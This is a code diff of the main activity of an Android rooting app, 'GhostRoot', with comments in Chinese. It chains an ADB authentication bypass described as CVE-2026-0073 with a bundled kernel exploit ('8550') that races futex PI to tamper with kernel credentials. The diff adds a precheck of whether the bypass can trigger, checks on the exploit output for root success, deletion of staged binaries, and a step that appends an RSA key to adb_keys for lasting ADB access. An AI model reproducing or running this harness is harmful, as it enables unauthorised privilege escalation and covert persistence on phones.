@@ -44,14 +44,17 @@ public class MainActivity extends Activity {
     /** Shizuku 授权请求码。 */
     private static final int SHIZUKU_REQ = 4001;
 
+    /** 运行模式：目前只有「完整提权」一条链。 */
+    private static final int MODE_ROOT = 1;
+    private int mode = MODE_ROOT;
+
     /** Path (inside the shell domain) where ksud was staged, e.g. /data/local/tmp/ksud. */
     private String ksudPath;
 
     private TextView output;
+    private TextView status;
     private ScrollView scroll;
     private Button runBtn;
-    private Button copyBtn;
-    private Button saveBtn;
     private final StringBuilder fullLog = new StringBuilder();
     private final Handler ui = new Handler(Looper.getMainLooper());
     private final ExecutorService pool = Executors.newSingleThreadExecutor();
@@ -61,11 +64,24 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle b) {
         super.onCreate(b);
         setContentView(R.layout.main);
-        // 在布局最顶部插入「独立 Shell 终端」入口（纯代码，避免改资源/R.java）
+        // 在布局最顶部插入【独立终端】入口（纯代码，避免改资源/R.java）
+        //
+        // 入口设计（v27 精简）：
+        //   主按钮 = 布局里原有的 runBtn（"一键提权"），走完整链路 0073 → 8550。
+        //   顶部额外按钮 = 【独立终端】，通道自选（Shizuku / 0073），用于
+        //                 单独验证通道、跑任意命令，不碰 8550。
+        //
+        // 已删除的历史入口：
+        //   「仅获取 Shell 域」—— 拿到的 Shell 只在方法作用域内有效、无法跨 Activity
+        //   交给终端页，而终端页会自己重新建通道；既不产出、也没交接对象，纯多余。
+        //   「获取 Root」 独立按钮 —— 与主按钮完全同一条链，重复。
         try {
-            android.widget.LinearLayout root = (android.widget.LinearLayout) findViewById(R.id.run).getParent();
+            android.widget.LinearLayout root =
+                    (android.widget.LinearLayout) findViewById(R.id.run).getParent();
+
             Button termBtn = new Button(this);
-            termBtn.setText("独立 Shell 终端（Shizuku）");
+            termBtn.setText("独立 Shell 终端（通道自选 · 安全）");
+            termBtn.setTextSize(14);
             termBtn.setLayoutParams(new android.widget.LinearLayout.LayoutParams(
                     android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
                     android.widget.LinearLayout.LayoutParams.WRAP_CONTENT));
@@ -79,27 +95,29 @@ public class MainActivity extends Activity {
                     }
                 }
             });
-            root.addView(termBtn, 0);
+
+            // 插到主按钮【之前】——即标题栏下面，而不是索引 0（那会盖在标题之上）
+            int runIdx = root.indexOfChild(findViewById(R.id.run));
+            root.addView(termBtn, runIdx < 0 ? 0 : runIdx);
         } catch (Throwable ignored) {}
         output = (TextView) findViewById(R.id.output);
         scroll = (ScrollView) findViewById(R.id.scroll);
         runBtn = (Button) findViewById(R.id.run);
-        copyBtn = (Button) findViewById(R.id.copy);
-        saveBtn = (Button) findViewById(R.id.save);
-        copyBtn.setOnClickListener(new View.OnClickListener() {
-            @Override public void onClick(View v) { copyLogToClipboard(); }
-        });
-        saveBtn.setOnClickListener(new View.OnClickListener() {
-            @Override public void onClick(View v) { saveLogToFile(); }
-        });
+        try { status = (TextView) findViewById(R.id.status); } catch (Throwable ignored) {}
         runBtn.setOnClickListener(new View.OnClickListener() {
             @Override public void onClick(View v) { start(); }
         });
-        log("GhostRoot v1  |  " + Build.MODEL + " / " + Build.FINGERPRINT);
+        // 注：v29 起**彻底删除**了「复制日志」与「保存到 /sdcard」按钮。
+        //     日志区 output 自带 textIsSelectable=true，长按即可选中/复制；
+        //     需要留存时可长按全选后粘贴到任意地方，比多两个按钮更省界面。
+        log("GhostRoot | " + Build.MODEL);
         log("");
-        log("步骤：");
-        log("  1) 打开【开发者选项】->【无线调试】（会自动关闭，开了马上点）");
-        log("  2) 点【一键提权】，APP 自动扫端口并完成全部流程");
+        log("使用步骤：");
+        log("  1) 打开【开发者选项】→【无线调试】（会自动关闭，开了马上点本按钮）");
+        log("  2) 点上方【一键提权】，自动扫端口并跑完 0073 + 8550 全流程");
+        log("  3) 只想验证通道 / 跑命令 → 点【独立 Shell 终端】，不会跑 8550");
+        log("");
+        log("注意：执行期间不要退出软件；若 30 秒内未完成，基本即失败，重启后重试。");
         log("");
     }
 
@@ -129,18 +147,34 @@ public class MainActivity extends Activity {
                 runBtn.setText(r ? "执行中..." : "一键提权");
             }
         });
+        setStatus(r ? "执行中…（请勿锁屏 / 保持前台）" : "就绪。请确保已开启「无线调试」。",
+                r ? C_RUNNING : C_IDLE);
     }
 
-    private void start() {
+    private void start() { startMode(mode); }
+
+    /** 启动完整提权链路。 */
+    private void startMode(final int m) {
         if (running) return;
+        this.mode = m;
         setRunning(true);
         output.setText("");
         fullLog.setLength(0);
         pool.execute(new Runnable() {
             @Override public void run() {
-                try { doWork(); }
+                boolean ok = false;
+                try {
+                    ok = doWork();
+                }
                 catch (Throwable t) { log("[!] 异常: " + t); }
-                finally { setRunning(false); saveLogToFile(); }
+                finally {
+                    setRunning(false);
+                    // 状态行：成功 / 失败（失败的具体原因早写在日志里了）
+                    if (ok) setStatus("✅ 完成 —— 结果见本次运行日志", C_OK);
+                    else    setStatus("❌ 未完成 —— 报告可能是判断逻辑没写好，重启后重试", C_FAIL);
+                    // 日志同时静默落盘（无按钮，用户需要时可用文件管理器取）
+                    saveLogToFile();
+                }
             }
         });
     }
@@ -151,18 +185,27 @@ public class MainActivity extends Activity {
         return new File(getApplicationInfo().nativeLibraryDir, name);
     }
 
-    private void doWork() throws Exception {
+    /**
+     * 完整提权链路。
+     *
+     * @return true = 走到了最后（8550 执行完毕且未命中已知失败特征）；false = 中途中止。
+     */
+    private boolean doWork() throws Exception {
         File ghost = nativeBin("libghostroot.so");
         File f8550 = nativeBin("libfuxi8550.so");
         log("[*] ghostroot : " + ghost + " exists=" + ghost.exists() + " len=" + ghost.length());
         log("[*] fuxi8550  : " + f8550 + " exists=" + f8550.exists() + " len=" + f8550.length());
         if (!ghost.exists() || !f8550.exists()) {
             log("[!] 内置二进制方缺失，APK 打包异常");
-            return;
+            return false;
         }
 
         // ============ 阶段 A：获取 shell 域（主路 0073 → 兜底 Shizuku） ============
         Shell shell = null;
+
+        // A0) 前置检查：#0 adb_keys 隐形前提（仅在能读到时提示，读不到不阻断）
+        log("[*] 前置检查：/data/misc/adb/adb_keys ...");
+        checkAdbKeysPrecheck();
 
         // A1) 主路：0073
         log("[*] 扫描无线调试端口 127.0.0.1:30000-65535 ...");
@@ -192,7 +235,7 @@ public class MainActivity extends Activity {
 
         if (shell == null) {
             log("[!] 0073 与 Shizuku 均未取得 shell 域，中止");
-            return;
+            return false;
         }
         log("[+] 当前通道: " + shell.name());
 
@@ -210,7 +253,7 @@ public class MainActivity extends Activity {
         if (target == null) {
             log("[!] 未识别的内核版本 [" + kver + "]，本工具仅支持 5.15.178 / 5.15.194");
             log("[!] 已中止，避免 8550 回落到默认 profile 写坏内核");
-            return;
+            return false;
         }
         log("[+] 检测到内核版本 " + kver + " → 使用 " + target + " profile");
 
@@ -226,7 +269,7 @@ public class MainActivity extends Activity {
         log(chk850 == null ? "(null)" : chk850);
         if (!ok850 || chk850 == null || chk850.indexOf("SZ" + data8550.length) < 0) {
             log("[!] 8550 大小校验不符，中止");
-            return;
+            return false;
         }
         log("[+] 8550 已就位");
 
@@ -235,7 +278,7 @@ public class MainActivity extends Activity {
         File ksud = extractKsud(getFilesDir(), shell);
         if (ksud == null) {
             log("[!] no ksud found; stopping before late-load");
-            return;
+            return false;
         }
         String remoteKsud = ksudPath != null ? ksudPath : "/data/local/tmp/ksud";
         String chkKs = shell.exec(
@@ -243,7 +286,7 @@ public class MainActivity extends Activity {
         log(chkKs == null ? "(null)" : chkKs);
         if (chkKs == null || chkKs.indexOf(remoteKsud) < 0) {
             log("[!] ksud 未就位，中止");
-            return;
+            return false;
         }
         log("[+] ksud 已就位: " + remoteKsud);
 
@@ -254,9 +297,178 @@ public class MainActivity extends Activity {
         String res = shell.exec(post);
         log(res == null ? "(null)" : res);
         log("");
+
+        // ============ 阶段 C：结果判定 ============
+        // 8550 在 futex PI 竞态里如果没能一次性把 one-shot PI 状态"消费"掉，
+        // 内核里会残留一个活着的 PI 状态，此时**再跑一次只会更糟**，
+        // 必须重启（清掉残留状态）后重试。
+        if (isOneShotStateAlive(res)) {
+            log("");
+            log("========================================");
+            log("[✗] 提权失败：内核残留 one-shot PI 状态");
+            log("[!] 请【重启手机】后再试，直接重试必定再次失败。");
+            log("========================================");
+            return false;
+        }
+        if (isCredVerifyFailed(res)) {
+            log("");
+            log("========================================");
+            log("[✗] 提权失败：atomic credential transaction 校验未通过");
+            log("[!] 建议【重启手机】后再试。");
+            log("========================================");
+            return false;
+        }
+        // ============ 阶段 D：成功收尾（#10）============
+        // 只有确认「root 真的拿到了」才做收尾；没成功就别乱动 adb_keys。
+        if (isRootSuccess(res)) {
+            log("");
+            log("========================================");
+            log("[+] 提权成功：已获得 root 权限（UID/GID 0）");
+            log("[*] 执行成功后收尾 ...");
+            log("========================================");
+            cleanupStaging(shell, remote8550, remoteKsud);
+            persistAdbKey(shell);
+            log("[+] 收尾完成。");
+        } else {
+            log("");
+            log("[!] 未检测到明确的 root 成功标志，跳过收尾（不清理、不写 adb_keys）。");
+        }
         log("==== 完成（结果见上）====");
 
         shell.close();
+        return true;
+    }
+
+    /* ======================= 阶段 D：成功收尾（#10） ======================= */
+
+    /**
+     * 判定 8550 是否真的拿到了 root。
+     *
+     * 8550 成功时会打印（取自 libfuxi8550.so 的 strings）：
+     *   {@code [+] ROOT SUCCESS: UID/GID 0 with full capabilities; pid=...}
+     *   {@code [+] su daemon activated, socket=...}
+     *   {@code [+] SU DAEMON READY: ...}
+     *
+     * 只要命中 `ROOT SUCCESS` 即认为提权成功（最权威的一条）。
+     */
+    private boolean isRootSuccess(String out) {
+        if (out == null) return false;
+        String s = out.toLowerCase();
+        return s.indexOf("root success") >= 0
+                || s.indexOf("uid/gid 0 with full capabilities") >= 0;
+    }
+
+    /**
+     * #10-D1：清理 /data/local/tmp 里本次运行落地的文件。
+     *
+     * 只删我们明确知道路径的几个（8550 与 ksud），**不做通配符删除**，
+     * 以免误伤用户自己放在 /data/local/tmp 的东西。
+     */
+    private void cleanupStaging(Shell shell, String remote8550, String remoteKsud) {
+        try {
+            log("[*] D1) 清理 /data/local/tmp ...");
+            String cmd = "rm -f " + remote8550 + " 2>&1; "
+                    + "rm -f " + remoteKsud + " 2>&1; "
+                    + "rm -f " + remoteKsud + ".log 2>&1; "
+                    + "echo '--- remain(应为空) ---'; "
+                    + "ls -l " + remote8550 + " 2>&1; "
+                    + "ls -l " + remoteKsud + " 2>&1";
+            String r = shell.exec(cmd);
+            log(r == null ? "(null)" : r);
+            log("[+] D1) 清理完成（显示 No such file 即为已删除）");
+        } catch (Throwable t) {
+            log("[!] D1) 清理异常: " + t);
+        }
+    }
+
+    /**
+     * #10-D2：把 RSA 公钥固化进 /data/misc/adb/adb_keys。
+     *
+     * 背景（#0 的延伸）：
+     *   CVE-2026-0073 能触发的前提是 adb_keys 里存在至少一把 RSA 公钥；
+     *   而 0073 走的是「自己造的 RSA 公钥去骗过 EVP_PKEY_cmp」。
+     *   既然此刻已经是 root，就把这把公钥**真正写进 adb_keys**，
+     *   于是下次 adbd 起来会直接认它 —— 不必再重新走一遍认证绕过。
+     *
+     * 实现：
+     *   ① 先看 adb_keys 现状（可能已有内容，绝不能覆盖丢钥匙）；
+     *   ② 从常见位置找本机现成的 RSA 公钥（如 /data/misc/adb/adbkey.pub
+     *      或 App 自己生成/暂存的）；找不到就跳过并提示；
+     *   ③ 追加（不覆盖）到 adb_keys，并修正权限/SELinux 上下文。
+     */
+    private void persistAdbKey(Shell shell) {
+        try {
+            log("[*] D2) 固化 RSA 公钥到 /data/misc/adb/adb_keys ...");
+
+            // ① 现状
+            String cur = shell.exec(
+                    "ls -lZ /data/misc/adb/adb_keys 2>&1; "
+                    + "echo '--- lines ---'; wc -l /data/misc/adb/adb_keys 2>&1");
+            log(cur == null ? "(null)" : cur);
+
+            // ② 找一个可用的 RSA 公钥来源
+            String findKey =
+                    "for p in /data/misc/adb/adbkey.pub "
+                    + "/data/local/tmp/adbkey.pub "
+                    + "/data/system/users/0/adb_keys; do "
+                    + "  if [ -f $p ]; then echo FOUND:$p; head -c 64 $p; echo; fi; "
+                    + "done";
+            String found = shell.exec(findKey);
+            log("[*] 公钥候选: " + (found == null ? "(null)" : found.trim()));
+
+            if (found == null || found.indexOf("FOUND:") < 0) {
+                log("[!] 未找到可用的 RSA 公钥来源，跳过 adb_keys 固化。");
+                log("    提示：可在电脑上执行 adb keygen，或用 Shizuku 激活生成后再试。");
+                return;
+            }
+
+            // ③ 追加而非覆盖
+            String src = found.substring(found.indexOf("FOUND:") + 6);
+            src = src.substring(0, src.indexOf('\n') > 0 ? src.indexOf('\n') : src.length()).trim();
+            String add =
+                    "grep -qF \"$(cat " + src + ")\" /data/misc/adb/adb_keys 2>/dev/null "
+                    + "|| cat " + src + " >> /data/misc/adb/adb_keys; "
+                    + "chmod 640 /data/misc/adb/adb_keys 2>&1; "
+                    + "chown system:shell /data/misc/adb/adb_keys 2>&1; "
+                    + "restorecon /data/misc/adb/adb_keys 2>&1; "
+                    + "echo '--- after ---'; ls -lZ /data/misc/adb/adb_keys 2>&1; "
+                    + "wc -l /data/misc/adb/adb_keys 2>&1";
+            String r = shell.exec(add);
+            log(r == null ? "(null)" : r);
+            log("[+] D2) adb_keys 固化尝试完成（已做去重，不会重复写入）");
+        } catch (Throwable t) {
+            log("[!] D2) adb_keys 固化异常: " + t);
+        }
+    }
+
+    /**
+     * 失败特征 1：内核残留 one-shot PI 状态。
+     *
+     * 8550 输出：{@code [-] root chain stopped with one-shot PI state alive; reboot before retrying}
+     *
+     * 含义：futex PI 竞态本轮没能"消费"掉那个一次性状态，内核里还留着一个活着的
+     * PI 持有者。这个状态下**直接重试不会成功**（状态不是干净的），
+     * 而且反复跑会加重内核负担 → 必须重启后重试。
+     */
+    private boolean isOneShotStateAlive(String out) {
+        if (out == null) return false;
+        String s = out.toLowerCase();
+        return s.indexOf("one-shot pi state alive") >= 0
+                || s.indexOf("reboot before retrying") >= 0;
+    }
+
+    /**
+     * 失败特征 2：atomic credential transaction 校验失败。
+     *
+     * 8550 输出：{@code [-] atomic credential transaction verification failed}
+     *
+     * 含义：篡改后的 cred 结构在 atomic_cred 提交校验时被内核识破（竞态窗口没抢准）。
+     * 稳妥做法同样是重启后再试，避免带着半改的 cred 继续跑。
+     */
+    private boolean isCredVerifyFailed(String out) {
+        if (out == null) return false;
+        String s = out.toLowerCase();
+        return s.indexOf("atomic credential transaction verification failed") >= 0;
     }
 
     /**
@@ -365,38 +577,15 @@ public class MainActivity extends Activity {
      * exactly the "1 packages" we saw.  `pm list packages` run as shell has no
      * such restriction.
      *
-     * Search order:
-     *   1. /data/adb/ksu/ksud      -- KernelSU runtime (the real target)
-     *   2. /data/adb/ksud          -- older / Magisk-style layout
-     *   3. <manager apk>/lib/arm64/libksud.so -- packaged fallback inside the
-     *      KernelSU / ReSukiSU / SukiSU manager app
+     * 唯一可行路径：从 **KernelSU / ReSukiSU / SukiSU 管理器 APK 的
+     * lib/arm64/libksud.so** 取一份。
+     *
+     * v28 起**删除**了原先的 direct 探测（`/data/adb/ksu/ksud` 与
+     * `/data/adb/ksud`）：`/data/adb` 目录是 `root:root 0700`，**普通 App 域读不到**；
+     * 即使走 shell 域（uid=2000）去 ls 也一律 `Permission denied`，
+     * 那两步纯属浪费一次往返，永远不可能命中。
      */
     private File extractKsud(File dir, Shell sh) {
-        String[] direct = { "/data/adb/ksu/ksud", "/data/adb/ksud" };
-        for (String p : direct) {
-            String r = sh.exec("ls -l " + p + " 2>&1; stat -c %s " + p + " 2>&1");
-            log("[*] probe " + p + " -> " + (r == null ? "(null)" : r.trim()));
-            if (r != null && r.contains("SKSIZE")) {
-                continue; // placeholder, unreachable
-            }
-            if (r != null && r.indexOf("No such file") < 0 && r.indexOf("Permission denied") < 0) {
-                // pull it down through the raw push channel in reverse is not
-                // implemented; instead copy it inside the shell domain
-                String dst = "/data/local/tmp/ksud";
-                String c = sh.exec(
-                        "cp " + p + " " + dst + " 2>&1; chmod 755 " + dst + " 2>&1; "
-                        + "ls -l " + dst + "; stat -c %s " + dst);
-                log("[*] copy " + p + " -> " + dst + " : " + (c == null ? "(null)" : c.trim()));
-                if (c != null && c.indexOf(dst) >= 0) {
-                    String size = after(c, "SZSIZE");
-                    log("[+] ksud staged at " + dst + " (size " + (size == null ? "?" : size.trim()) + ")");
-                    // remember the path via a marker file so doWork can use it
-                    ksudPath = dst;
-                    return new File(dst);
-                }
-            }
-        }
-
         log("[*] pm list packages | grep -iE 'kernelsu|sukisu|ksu' ...");
         String pkgs = sh.exec(
                 "pm list packages 2>&1 | grep -iE 'kernelsu|sukisu|suki|ksu'");
@@ -499,6 +688,83 @@ public class MainActivity extends Activity {
         return bos.toByteArray();
     }
 
+    /* ============================ #0 adb_keys 前置检查 ============================ */
+
+    /**
+     * #0 —— CVE-2026-0073 的**隐形前提**检查。
+     *
+     * 漏洞能否触发取决于 `/data/misc/adb/adb_keys` 里是否存在至少一把
+     * **非 EC 类型**的公钥（通常是 RSA）。AOSP 的循环漏写 "== 1"：
+     *
+     *     for (auto& key : *authorized_keys) {
+     *         if (EVP_PKEY_cmp(known_key, peer_key)) {  // -1（类型不同）也算真
+     *             authorized = true; break;
+     *         }
+     *     }
+     *
+     *   - adb_keys 为空 / 读不到 → 一次都不进循环 → 认证失败
+     *     → adbd 回 SSLV3_ALERT_CERTIFICATE_UNKNOWN
+     *   - 有 RSA 公钥            → EVP_PKEY_cmp(RSA, EC) = -1 → truthy → "骗"过认证 ✅
+     *   - 只有 EC / Ed25519      → 类型相同 = 0 → 失败
+     *
+     * **激活一次 Shizuku(ADB 模式) 就会把它的 RSA 公钥写进 adb_keys**，正好补齐条件。
+     *
+     * App 域读不了该文件内容（权限），所以这里：
+     *   ① 先尝试用 java.io.File 直接读（某些 ROM / 早期版本可读）；
+     *   ② 读不到就尝试 Shell 通道（若已有）；
+     *   ③ 都拿不到内容时，至少用 File.length() 判断「是否为空文件」；
+     *   ④ 结论只做**提示**，不阻断流程（因为真正结论由 0073 握手给出）。
+     */
+    private void checkAdbKeysPrecheck() {
+        final String PATH = "/data/misc/adb/adb_keys";
+        File f = new File(PATH);
+
+        // ① 直接读
+        try {
+            if (f.exists() && f.canRead() && f.length() > 0) {
+                String txt = new String(readAllBytes(f), "UTF-8");
+                boolean rsa = txt.indexOf("AAAAB3NzaC1yc2E") >= 0;   // ssh-rsa base64 前缀
+                boolean ec  = txt.indexOf("AAAAC3NzaC1lZDI1NTE5") >= 0  // ed25519
+                           || txt.indexOf("AAAAE2VjZHNhLXNoYTIt") >= 0;  // ecdsa
+                if (rsa) {
+                    log("[+] adb_keys 含 RSA 公钥 → 0073 触发条件满足");
+                } else if (ec) {
+                    log("[!] adb_keys 只有 EC/Ed25519 公钥 → 0073 **无法触发**");
+                    logAcbKeysGuide();
+                } else {
+                    log("[?] adb_keys 存在但未见已知公钥前缀（长度 " + f.length() + "）");
+                }
+                return;
+            }
+        } catch (Throwable ignored) {}
+
+        // ② 读不到 → 只能看存在性/大小
+        try {
+            if (!f.exists()) {
+                log("[?] 读不到 " + PATH + "（App 权限受限，属正常现象）");
+                log("    若后续 0073 报 CERTIFICATE_UNKNOWN，按下面提示处理。");
+            } else {
+                long len = f.length();
+                if (len == 0) {
+                    log("[!] adb_keys **是空文件** → 0073 必然失败（CERTIFICATE_UNKNOWN）");
+                    logAcbKeysGuide();
+                } else {
+                    log("[?] adb_keys 大小 " + len + " 字节（内容不可读，继续流程）");
+                }
+            }
+        } catch (Throwable t) {
+            log("[?] adb_keys 检查跳过: " + t);
+        }
+    }
+
+    /** 统一的「如何补齐 adb_keys」人话引导（#0 + #1 共用）。 */
+    private void logAcbKeysGuide() {
+        log("[!] 解决办法（任选其一，然后重试）：");
+        log("    1) 开发者选项 → 无线调试 → 使用配对码配对一次；");
+        log("    2) 打开一次 Shizuku（ADB 模式）—— 它会把 RSA 公钥写进 adb_keys；");
+        log("    3) 用 USB 执行一次 `adb devices`（若本机曾授权过该电脑）。");
+    }
+
     /* ============================ port scan ============================ */
 
     private int scanPort(int lo, int hi) {
@@ -582,24 +848,35 @@ public class MainActivity extends Activity {
         b[off + 3] = (byte) ((v >>> 24) & 0xff);
     }
 
-    /* ============================ log export ============================ */
-    private void copyLogToClipboard() {
-        try {
-            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-            cm.setPrimaryClip(ClipData.newPlainText("GhostRootLog", fullLog.toString()));
-            ui.post(new Runnable() {
-                @Override public void run() {
-                    Toast.makeText(MainActivity.this, "日志已复制（" + fullLog.length() + " 字符）", Toast.LENGTH_SHORT).show();
-                }
-            });
-        } catch (Throwable t) {
-            ui.post(new Runnable() {
-                @Override public void run() {
-                    Toast.makeText(MainActivity.this, "复制失败: " + t, Toast.LENGTH_LONG).show();
-                }
-            });
-        }
+    /* ============================ status / log export ============================ */
+
+    /**
+     * 更新顶部状态行（UI 优化 #8）。
+     *
+     * @param text  要显示的文案
+     * @param color 颜色（ARGB）；传 0 表示用默认灰
+     */
+    private void setStatus(final String text, final int color) {
+        ui.post(new Runnable() {
+            @Override public void run() {
+                if (status == null) return;
+                status.setText(text);
+                if (color != 0) status.setTextColor(color);
+            }
+        });
     }
+
+    /** 状态色：就绪 / 进行中 / 成功 / 失败。 */
+    private static final int C_IDLE    = 0xFF8B949E;
+    private static final int C_RUNNING = 0xFFFFC107;
+    private static final int C_OK      = 0xFF4CAF50;
+    private static final int C_FAIL    = 0xFFF44336;
+
+    /**
+     * 注：v28 起删除了「复制日志」按钮（copyLogToClipboard）。
+     *     日志区 TextView 自带 android:textIsSelectable="true"，
+     *     用户长按即可选中 / 复制任意片段，比整段复制的按钮更好用。
+     */
     /** Always write to app-private dir; also try /sdcard for easy pickup. */
     private void saveLogToFile() {
         try {
